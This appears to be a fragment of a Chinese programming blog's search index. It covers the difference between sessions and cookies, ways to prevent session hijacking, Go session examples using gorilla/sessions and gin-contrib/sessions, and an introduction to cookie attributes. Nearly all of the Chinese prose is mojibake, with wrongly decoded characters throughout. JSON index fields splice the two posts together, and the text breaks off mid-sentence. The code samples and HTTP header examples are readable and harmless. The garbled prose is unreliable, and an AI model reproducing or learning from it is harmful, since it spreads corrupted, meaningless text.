Sessionä¸Cookieçš„åŒºåˆ«\n\ncookieä¸sessionæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯å°†æ•°æ®å­˜æ”¾åœ¨å®¢æˆ·ç«¯ï¼Œä¸€ä¸ªæ˜¯å°†æ•°æ®å­˜æ”¾åœ¨æœåŠ¡ç«¯ã€‚cookieæ˜¯å°†ä¿¡æ¯éƒ½å­˜æ”¾åœ¨å®¢æˆ·ç«¯çš„æµè§ˆå™¨å†…å­˜æˆ–ç£ç›˜ä¸­ï¼Œæ‰€ä»¥ä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„cookieæ•°æ®æ¥è¿›è¡Œç”¨æˆ·ä¿¡æ¯çš„ç›—çªƒæˆ–è¿›è¡Œcookieæ¬ºéª—ã€‚\n\næ‰€ä»¥åœ¨å®‰å…¨æ€§ä¸Šsessionè¦å¥½ä¸€äº›ï¼Œsessioné€šä¿¡çš„ä¸€èˆ¬å®ç°å½¢å¼æ˜¯é€šè¿‡cookieæ¥å®ç°ï¼Œä¸cookieä¸åŒçš„æ˜¯ï¼Œsessionåªä¼šä¿å­˜ä¸€ä¸ªsessionIDåœ¨å®¢æˆ·ç«¯ï¼Œä¸ä¼šåƒcookieé‚£æ ·å°†å…·ä½“çš„æ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œsessionå…·ä½“çš„æ•°æ®åªä¼šä¿å­˜åœ¨æœåŠ¡ç«¯ä¸Š\n\nåœ¨Servletä¸­sessionæ•°æ®æ˜¯è¢«å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œï¼Œè€Œè¿™ä¸ªå¯¹è±¡ä¼šè¢«ä¿å­˜åœ¨å¯¹è±¡æ± ä¸­ï¼Œå®¢æˆ·ç«¯å‘ç”Ÿè¯·æ±‚æ—¶ä¼šå¸¦ä¸Šå®ƒçš„sessionIDï¼ŒæœåŠ¡ç«¯å°±ä¼šæ ¹æ®è¿™ä¸ªsessionIDï¼Œæ¥ä»å¯¹è±¡æ± ä¸­è·å¾—ç›¸åº”çš„sessionå¯¹è±¡ï¼Œä»å¯¹è±¡ä¸­è·å¾—sessionçš„å…·ä½“æ•°æ®ï¼ŒæœåŠ¡ç«¯é€šè¿‡è¿™ä¸ªsessionæ•°æ®æ¥ä¿æŒæˆ–æ”¹å˜ä¸å®¢æˆ·ç«¯ä¼šè¯çš„çŠ¶æ€ã€‚\n\n\n\n##### 1.2 Sessionæœºåˆ¶\n\nä»¥ä¸Šä¹Ÿä»‹ç»äº†Sessionæœ‰ä¸¤ä¸ªä¸»è¦çš„ä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯SessionIDï¼Œä¸€ä¸ªæ˜¯å­˜æ”¾åœ¨æœåŠ¡ç«¯å¯¹è±¡æ± ä¸­çš„Sessionå¯¹è±¡ã€‚\n\nå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­è¿™ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ®ä¸­æ˜¯å¦åŒ…å«æœ‰SessionIDï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå°±ä¼šè®¤ä¸ºè¿™ä¸ªå®¢æˆ·ç«¯æ˜¯ç¬¬ä¸€æ¬¡è¿›è¡Œè®¿é—®ã€‚å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œæ‰€ä»¥æœåŠ¡ç«¯ä¼šç»™å®¢æˆ·ç«¯åœ¨å¯¹è±¡æ± ä¸­åˆ›å»ºä¸€ä¸ªSessionå¯¹è±¡ï¼ˆå‡è®¾è¿™ä¸ªä¼šè¯æ˜¯éœ€è¦ç»´æŒçš„ï¼‰ï¼Œå¹¶ç”Ÿæˆå‡ºè¿™ä¸ªå¯¹è±¡çš„SessionIDï¼Œæ¥ç€ä¼šé€šè¿‡cookieå°†SessionIDå“åº”ç»™å®¢æˆ·ç«¯ï¼ŒåŒæ—¶ä¼šæŠŠSessionå¯¹è±¡æ”¾å›å¯¹è±¡æ± é‡Œã€‚å®¢æˆ·ç«¯æ¥æ”¶å“åº”æ•°æ®åä¼šå°†SessionIDå­˜æ”¾åœ¨æœ¬åœ°ï¼Œä¸‹ä¸€æ¬¡å†è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™å°±ä¼šæŠŠSessionIDç»™å¸¦ä¸Šï¼ŒæœåŠ¡ç«¯å°±èƒ½å¤Ÿé€šè¿‡SessionIDè·å¾—ç›¸åº”çš„Sessionå¯¹è±¡ï¼ŒSessionå°±æ˜¯ä»¥è¿™æ ·çš„ä¸€ä¸ªæœºåˆ¶ç»´æŒä¼šè¯çŠ¶æ€çš„ã€‚\n\n\n\n##### 1.3 session å­˜å‚¨é—®é¢˜\n\nsessionå¦‚ä½•å­˜å‚¨æ‰æ˜¯é«˜æ•ˆï¼Œæ˜¯å­˜åœ¨å†…å­˜ã€æ–‡ä»¶è¿˜æ˜¯æ•°æ®åº“äº†ï¼Ÿæ–‡ä»¶å’Œæ•°æ®åº“çš„å­˜å‚¨æ–¹å¼éƒ½æ˜¯å°†sessionçš„æ•°æ®å›ºåŒ–åˆ°ç¡¬ç›˜ä¸Šï¼Œæ“ä½œç¡¬ç›˜çš„æ–¹å¼å°±æ˜¯IOï¼ŒIOæ“ä½œçš„æ•ˆç‡æ˜¯è¿œè¿œä½äºæ“ä½œå†…å­˜çš„æ•°æ®ï¼Œå› æ­¤æ–‡ä»¶å’Œæ•°æ®åº“å­˜å‚¨æ–¹å¼æ˜¯ä¸å¯å–çš„ï¼Œæ‰€ä»¥å°†sessionæ•°æ®å­˜å‚¨åˆ°å†…å­˜æ˜¯æœ€ä½³çš„é€‰æ‹©ã€‚\n\nå› æ­¤æœ€å¥½çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨åˆ†å¸ƒå¼ç¼“å­˜æŠ€æœ¯ï¼Œä¾‹å¦‚ï¼šmemcachedå’Œredisï¼Œå°†sessionä¿¡æ¯çš„å­˜å‚¨ç‹¬ç«‹å‡ºæ¥ä¹Ÿæ˜¯è§£å†³sessionåŒæ­¥é—®é¢˜çš„æ–¹æ³•ã€‚\n\n\n\n##### 1.4 sessionåŠ«æŒé˜²èŒƒ\n\nå…¶ä¸­ä¸€ä¸ªè§£å†³æ–¹æ¡ˆå°±æ˜¯sessionIDçš„å€¼åªå…è®¸cookieè®¾ç½®ï¼Œè€Œä¸æ˜¯é€šè¿‡URLé‡ç½®æ–¹å¼è®¾ç½®ï¼ŒåŒæ—¶è®¾ç½®cookieçš„httponlyä¸ºtrue,è¿™ä¸ªå±æ€§æ˜¯è®¾ç½®æ˜¯å¦å¯é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬è®¿é—®è¿™ä¸ªè®¾ç½®çš„cookieï¼Œç¬¬ä¸€è¿™ä¸ªå¯ä»¥é˜²æ­¢è¿™ä¸ªcookieè¢«XSSè¯»å–ä»è€Œå¼•èµ·sessionåŠ«æŒï¼Œç¬¬äºŒcookieè®¾ç½®ä¸ä¼šåƒURLé‡ç½®æ–¹å¼é‚£ä¹ˆå®¹æ˜“è·å–sessionIDã€‚\n\nç¬¬äºŒæ­¥å°±æ˜¯åœ¨æ¯ä¸ªè¯·æ±‚é‡Œé¢åŠ ä¸Štokenï¼Œå®ç°ç±»ä¼¼å‰é¢ç« èŠ‚é‡Œé¢è®²çš„é˜²æ­¢formé‡å¤é€’äº¤ç±»ä¼¼çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨æ¯ä¸ªè¯·æ±‚é‡Œé¢åŠ ä¸Šä¸€ä¸ªéšè—çš„tokenï¼Œç„¶åæ¯æ¬¡éªŒè¯è¿™ä¸ªtokenï¼Œä»è€Œä¿è¯ç”¨æˆ·çš„è¯·æ±‚éƒ½æ˜¯å”¯ä¸€æ€§ã€‚\n\nè¿˜æœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œæˆ‘ä»¬ç»™sessioné¢å¤–è®¾ç½®ä¸€ä¸ªåˆ›å»ºæ—¶é—´çš„å€¼ï¼Œä¸€æ—¦è¿‡äº†ä¸€å®šçš„æ—¶é—´ï¼Œæˆ‘ä»¬é”€æ¯è¿™ä¸ªsessionIDï¼Œé‡æ–°ç”Ÿæˆæ–°çš„sessionï¼Œè¿™æ ·å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢sessionåŠ«æŒçš„é—®é¢˜ã€‚\n\n\n\n### 2. golang ä½¿ç”¨ session\n\n+ github.com/gorilla/sessions\n\n```go\n// sessions.go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/sessions\"\n)\n\nvar (\n    // key must be 16, 24 or 32 bytes long (AES-128, AES-192 or AES-256)\n    key = []byte(\"super-secret-key\")\n    store = sessions.NewCookieStore(key)\n)\n\nfunc secret(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Check if user is authenticated\n    if auth, ok := session.Values[\"authenticated\"].(bool); !ok || !auth {\n        http.Error(w, \"Forbidden\", http.StatusForbidden)\n        return\n    }\n\n    // Print secret message\n    fmt.Fprintln(w, \"The cake is a lie!\")\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Authentication goes here\n    // ...\n\n    // Set user as authenticated\n    session.Values[\"authenticated\"] = true\n    session.Save(r, w)\n}\n\nfunc logout(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Revoke users authentication\n    session.Values[\"authenticated\"] = false\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/secret\", secret)\n    http.HandleFunc(\"/login\", login)\n    http.HandleFunc(\"/logout\", logout)\n\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n\n\n```bash\n$ go run sessions.go\n\n$ curl -s http://localhost:8080/secret\nForbidden\n\n$ curl -s -I http://localhost:8080/login\nSet-Cookie: cookie-name=MTQ4NzE5Mz...\n\n$ curl -s --cookie \"cookie-name=MTQ4NzE5Mz...\" http://localhost:8080/secret\nThe cake is a lie!\n```\n\n\n\n+ https://github.com/gin-contrib/sessions\n\n```go\npackage main\n\nimport (\n\t\"github.com/gin-contrib/sessions\"\n\t\"github.com/gin-contrib/sessions/cookie\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tstore := cookie.NewStore([]byte(\"secret\"))\n\tr.Use(sessions.Sessions(\"mysession\", store))\n\n\tr.GET(\"/incr\", func(c *gin.Context) {\n\t\tsession := sessions.Default(c)\n\t\tvar count int\n\t\tv := session.Get(\"count\")\n\t\tif v == nil {\n\t\t\tcount = 0\n\t\t} else {\n\t\t\tcount = v.(int)\n\t\t\tcount++\n\t\t}\n\t\tsession.Set(\"count\", count)\n\t\tsession.Save()\n\t\tc.JSON(200, gin.H{\"count\": count})\n\t})\n\tr.Run(\":8000\")\n}\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://www.iteye.com/blog/justsee-1570652\n+ https://gowebexamples.com/sessions/\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/06.0.md\n\n\n\n","tags":["session"],"categories":["Web"]},{"title":"cookieçš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F2a7234ed.html","content":"\n\n\n### 0. å‰è¨€\n\nCookie æ˜¯åœ¨ HTTP åè®®ä¸‹ï¼ŒæœåŠ¡å™¨æˆ–è„šæœ¬å¯ä»¥ç»´æŠ¤å®¢æˆ·å·¥ä½œç«™ä¸Šä¿¡æ¯çš„ä¸€ç§æ–¹å¼ã€‚Cookie æ˜¯ç”± `Web æœåŠ¡å™¨`ä¿å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šçš„å°æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒå¯ä»¥åŒ…å«æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ã€‚æ— è®ºä½•æ—¶ç”¨æˆ·é“¾æ¥åˆ°æœåŠ¡å™¨ï¼ŒWeb ç«™ç‚¹éƒ½å¯ä»¥è®¿é—® Cookie ä¿¡æ¯ã€‚\n\nCookieå®é™…ä¸Šæ˜¯ä¸€å°æ®µçš„æ–‡æœ¬ä¿¡æ¯ã€‚å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨responseå‘å®¢æˆ·ç«¯æµè§ˆå™¨é¢å‘ä¸€ä¸ªCookieã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookieä¿å­˜èµ·æ¥ã€‚å½“æµè§ˆå™¨å†è¯·æ±‚è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æŠŠè¯·æ±‚çš„ç½‘å€è¿åŒè¯¥Cookieä¸€åŒæäº¤ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ£€æŸ¥è¯¥Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚æœåŠ¡å™¨è¿˜å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹Cookieçš„å†…å®¹ã€‚\n\n<!-- more -->\n\n### 1. Cookie ä»‹ç»\n\nCookie æ˜¯æœåŠ¡å™¨ä¿å­˜åœ¨æµè§ˆå™¨çš„ä¸€å°æ®µæ–‡æœ¬ä¿¡æ¯ï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸€èˆ¬ä¸èƒ½è¶…è¿‡4KBã€‚æµè§ˆå™¨æ¯æ¬¡å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é™„ä¸Šè¿™æ®µä¿¡æ¯ã€‚\n\nCookie ä¸»è¦ç”¨æ¥åˆ†è¾¨ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€ä¸ªæµè§ˆå™¨ï¼Œä»¥åŠç”¨æ¥ä¿å­˜ä¸€äº›çŠ¶æ€ä¿¡æ¯ã€‚å®ƒçš„å¸¸ç”¨åœºåˆæœ‰ä»¥ä¸‹ä¸€äº›ã€‚\n\n- å¯¹è¯ï¼ˆsessionï¼‰ç®¡ç†ï¼šä¿å­˜ç™»å½•ã€è´­ç‰©è½¦ç­‰éœ€è¦è®°å½•çš„ä¿¡æ¯ã€‚\n- ä¸ªæ€§åŒ–ï¼šä¿å­˜ç”¨æˆ·çš„åå¥½ï¼Œæ¯”å¦‚ç½‘é¡µçš„å­—ä½“å¤§å°ã€èƒŒæ™¯è‰²ç­‰ç­‰ã€‚\n- è¿½è¸ªï¼šè®°å½•å’Œåˆ†æç”¨æˆ·è¡Œä¸ºã€‚\n\næœ‰äº›å¼€å‘è€…ä½¿ç”¨ Cookie ä½œä¸ºå®¢æˆ·ç«¯å‚¨å­˜ã€‚è¿™æ ·åšè™½ç„¶å¯è¡Œï¼Œä½†æ˜¯å¹¶ä¸æ¨èï¼Œå› ä¸º Cookie çš„è®¾è®¡ç›®æ ‡å¹¶ä¸æ˜¯è¿™ä¸ªï¼Œå®ƒçš„å®¹é‡å¾ˆå°ï¼ˆ4KBï¼‰ï¼Œç¼ºä¹æ•°æ®æ“ä½œæ¥å£ï¼Œè€Œä¸”ä¼šå½±å“æ€§èƒ½ã€‚å®¢æˆ·ç«¯å‚¨å­˜åº”è¯¥ä½¿ç”¨ Web storage API å’Œ IndexedDBã€‚\n\n\n\n> Cookie åŒ…å«ä»¥ä¸‹å‡ æ–¹é¢çš„ä¿¡æ¯:\n\n- Cookie çš„åå­—\n- Cookie çš„å€¼ï¼ˆçœŸæ­£çš„æ•°æ®å†™åœ¨è¿™é‡Œé¢ï¼‰\n- åˆ°æœŸæ—¶é—´\n- æ‰€å±åŸŸåï¼ˆé»˜è®¤æ˜¯å½“å‰åŸŸåï¼‰\n- ç”Ÿæ•ˆçš„è·¯å¾„ï¼ˆé»˜è®¤æ˜¯å½“å‰ç½‘å€ï¼‰\n\nä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è®¿é—®ç½‘å€`www.example.com`ï¼ŒæœåŠ¡å™¨åœ¨æµè§ˆå™¨å†™å…¥ä¸€ä¸ª Cookieã€‚è¿™ä¸ª Cookie å°±ä¼šåŒ…å«`www.example.com`è¿™ä¸ªåŸŸåï¼Œä»¥åŠæ ¹è·¯å¾„`/`ã€‚è¿™æ„å‘³ç€ï¼Œè¿™ä¸ª Cookie å¯¹è¯¥åŸŸåçš„æ ¹è·¯å¾„å’Œå®ƒçš„æ‰€æœ‰å­è·¯å¾„éƒ½æœ‰æ•ˆã€‚å¦‚æœè·¯å¾„è®¾ä¸º`/forums`ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie åªæœ‰åœ¨è®¿é—®`www.example.com/forums`åŠå…¶å­è·¯å¾„æ—¶æ‰æœ‰æ•ˆã€‚ä»¥åï¼Œæµè§ˆå™¨ä¸€æ—¦è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œæµè§ˆå™¨å°±ä¼šé™„ä¸Šè¿™æ®µ Cookie å‘é€ç»™æœåŠ¡å™¨ã€‚ \n\n\n\n##### 1.1 åˆ¤æ–­cookie\n\næµè§ˆå™¨å¯ä»¥è®¾ç½®ä¸æ¥å— Cookieï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸å‘æœåŠ¡å™¨å‘é€ Cookieã€‚`window.navigator.cookieEnabled`å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½ã€‚\n\n```bash\n// æµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½\nwindow.navigator.cookieEnabled // true\n```\n\n`document.cookie`å±æ€§è¿”å›å½“å‰ç½‘é¡µçš„ Cookieã€‚\n\n```\n// å½“å‰ç½‘é¡µçš„ Cookie\ndocument.cookie\n```\n\nåŒæµè§ˆå™¨å¯¹ Cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸåè®¾ç½®çš„ Cookie ä¸åº”è¶…è¿‡30ä¸ªï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼ŒCookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®ã€‚\n\næµè§ˆå™¨çš„åŒæºæ”¿ç­–è§„å®šï¼Œä¸¤ä¸ªç½‘å€åªè¦åŸŸåç›¸åŒå’Œç«¯å£ç›¸åŒï¼Œå°±å¯ä»¥å…±äº« Cookieï¼ˆå‚è§ã€ŠåŒæºæ”¿ç­–ã€‹ä¸€ç« ï¼‰ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¸è¦æ±‚åè®®ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ`http://example.com`è®¾ç½®çš„ Cookieï¼Œå¯ä»¥è¢«`https://example.com`è¯»å–ã€‚\n\n\n\n##### 1.2 Cookie ä¸ HTTP åè®®\n\nCookie ç”± HTTP åè®®ç”Ÿæˆï¼Œä¹Ÿä¸»è¦æ˜¯ä¾› HTTP åè®®ä½¿ç”¨ã€‚\n\n> 1.2.1 HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ\n\næœåŠ¡å™¨å¦‚æœå¸Œæœ›åœ¨æµè§ˆå™¨ä¿å­˜ Cookieï¼Œå°±è¦åœ¨ HTTP å›åº”çš„å¤´ä¿¡æ¯é‡Œé¢ï¼Œæ”¾ç½®ä¸€ä¸ª`Set-Cookie`å­—æ®µã€‚\n\n```\nSet-Cookie:foo=bar\n```\n\nä¸Šé¢ä»£ç ä¼šåœ¨æµè§ˆå™¨ä¿å­˜ä¸€ä¸ªåä¸º`foo`çš„ Cookieï¼Œå®ƒçš„å€¼ä¸º`bar`ã€‚\n\nHTTP å›åº”å¯ä»¥åŒ…å«å¤šä¸ª`Set-Cookie`å­—æ®µï¼Œå³åœ¨æµè§ˆå™¨ç”Ÿæˆå¤šä¸ª Cookieã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\né™¤äº† Cookie çš„å€¼ï¼Œ`Set-Cookie`å­—æ®µè¿˜å¯ä»¥é™„åŠ  Cookie çš„å±æ€§ã€‚\n\n```\nSet-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n```\n\nä¸€ä¸ª`Set-Cookie`å­—æ®µé‡Œé¢ï¼Œå¯ä»¥åŒæ—¶åŒ…æ‹¬å¤šä¸ªå±æ€§ï¼Œæ²¡æœ‰æ¬¡åºçš„è¦æ±‚ã€‚\n\n\n\nå¦‚æœæœåŠ¡å™¨æƒ³æ”¹å˜ä¸€ä¸ªæ—©å…ˆè®¾ç½®çš„ Cookieï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šCookie çš„`key`ã€`domain`ã€`path`å’Œ`secure`éƒ½åŒ¹é…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåŸå§‹çš„ Cookie æ˜¯ç”¨å¦‚ä¸‹çš„`Set-Cookie`è®¾ç½®çš„ã€‚\n\n```\nSet-Cookie: key1=value1; domain=example.com; path=/blog\n```\n\næ”¹å˜ä¸Šé¢è¿™ä¸ª Cookie çš„å€¼ï¼Œå°±å¿…é¡»ä½¿ç”¨åŒæ ·çš„`Set-Cookie`ã€‚\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n```\n\nåªè¦æœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„ Cookieï¼Œè€Œä¸æ˜¯æ›¿æ¢æ‰åŸæ¥é‚£ä¸ª Cookieã€‚\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/\n```\n\nä¸Šé¢çš„å‘½ä»¤è®¾ç½®äº†ä¸€ä¸ªå…¨æ–°çš„åŒå Cookieï¼Œä½†æ˜¯`path`å±æ€§ä¸ä¸€æ ·ã€‚ä¸‹ä¸€æ¬¡è®¿é—®`example.com/blog`çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨å‘é€ä¸¤ä¸ªåŒåçš„ Cookieã€‚\n\n```\nCookie: key1=value1; key1=value2\n```\n\nä¸Šé¢ä»£ç çš„ä¸¤ä¸ª Cookie æ˜¯åŒåçš„ï¼ŒåŒ¹é…è¶Šç²¾ç¡®çš„ Cookie æ’åœ¨è¶Šå‰é¢ã€‚\n\n\n\n> 1.2.2 HTTP è¯·æ±‚ï¼šCookie çš„å‘é€\n\næµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Šç›¸åº”çš„ Cookieã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠæœåŠ¡å™¨æ—©å‰ä¿å­˜åœ¨æµè§ˆå™¨çš„è¿™æ®µä¿¡æ¯ï¼Œå†å‘å›æœåŠ¡å™¨ã€‚è¿™æ—¶è¦ä½¿ç”¨ HTTP å¤´ä¿¡æ¯çš„`Cookie`å­—æ®µã€‚\n\n```\nCookie: foo=bar\n```\n\nä¸Šé¢ä»£ç ä¼šå‘æœåŠ¡å™¨å‘é€åä¸º`foo`çš„ Cookieï¼Œå€¼ä¸º`bar`ã€‚\n\n`Cookie`å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª Cookieï¼Œä½¿ç”¨åˆ†å·ï¼ˆ`;`ï¼‰åˆ†éš”ã€‚\n\n```\nCookie: name=value; name2=value2; name3=value3\n```\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\næœåŠ¡å™¨æ”¶åˆ°æµè§ˆå™¨å‘æ¥çš„ Cookie æ—¶ï¼Œæœ‰ä¸¤ç‚¹æ˜¯æ— æ³•çŸ¥é“çš„ã€‚\n\n- Cookie çš„å„ç§å±æ€§ï¼Œæ¯”å¦‚ä½•æ—¶è¿‡æœŸã€‚\n- å“ªä¸ªåŸŸåè®¾ç½®çš„ Cookieï¼Œåˆ°åº•æ˜¯ä¸€çº§åŸŸåè®¾çš„ï¼Œè¿˜æ˜¯æŸä¸€ä¸ªäºŒçº§åŸŸåè®¾çš„ã€‚\n\n\n\n##### 1.3 Cookie çš„å±æ€§\n\n> 1.3.1 Expiresï¼ŒMax-Age\n\n`Expires`å±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å®ƒçš„å€¼æ˜¯ UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨`Date.prototype.toUTCString()`è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\nå¦‚æœä¸è®¾ç½®è¯¥å±æ€§ï¼Œæˆ–è€…è®¾ä¸º`null`ï¼ŒCookie åªåœ¨å½“å‰ä¼šè¯ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨çª—å£ä¸€æ—¦å…³é—­ï¼Œå½“å‰ Session ç»“æŸï¼Œè¯¥ Cookie å°±ä¼šè¢«åˆ é™¤ã€‚å¦å¤–ï¼Œæµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š Cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ Cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸã€‚\n\n\n\n`Max-Age`å±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ Cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚`60 * 60 * 24 * 365`ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚\n\nå¦‚æœåŒæ—¶æŒ‡å®šäº†`Expires`å’Œ`Max-Age`ï¼Œé‚£ä¹ˆ`Max-Age`çš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚\n\nå¦‚æœ`Set-Cookie`å­—æ®µæ²¡æœ‰æŒ‡å®š`Expires`æˆ–`Max-Age`å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie å°±æ˜¯ Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ª Cookieã€‚\n\n\n\n> 1.3.2 Domainï¼ŒPath\n\n`Domain`å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›åŸŸåè¦é™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºå½“å‰ URL çš„ä¸€çº§åŸŸåï¼Œæ¯”å¦‚`www.example.com`ä¼šè®¾ä¸º`example.com`ï¼Œè€Œä¸”ä»¥åå¦‚æœè®¿é—®`example.com`çš„ä»»ä½•å­åŸŸåï¼ŒHTTP è¯·æ±‚ä¹Ÿä¼šå¸¦ä¸Šè¿™ä¸ª Cookieã€‚å¦‚æœæœåŠ¡å™¨åœ¨`Set-Cookie`å­—æ®µæŒ‡å®šçš„åŸŸåï¼Œä¸å±äºå½“å‰åŸŸåï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è¿™ä¸ª Cookieã€‚\n\n\n\n`Path`å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ª 